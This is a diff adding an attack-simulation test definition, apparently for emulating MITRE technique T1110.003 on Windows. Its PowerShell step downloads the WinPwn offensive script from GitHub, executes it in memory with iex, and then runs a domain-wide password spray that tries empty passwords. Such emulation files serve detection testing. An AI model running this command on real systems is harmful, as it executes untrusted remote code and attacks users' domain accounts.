@@ -1,0 +1,24 @@
+api_version: "2.0"
+name: WinPwn - DomainPasswordSpray Attacks
+description: DomainPasswordSpray Attacks technique via function of WinPwn
+uuid: 5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.003: Password Spraying'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---domainpasswordspray-attacks
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        domainpassspray -consoleoutput -noninteractive -emptypasswords
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
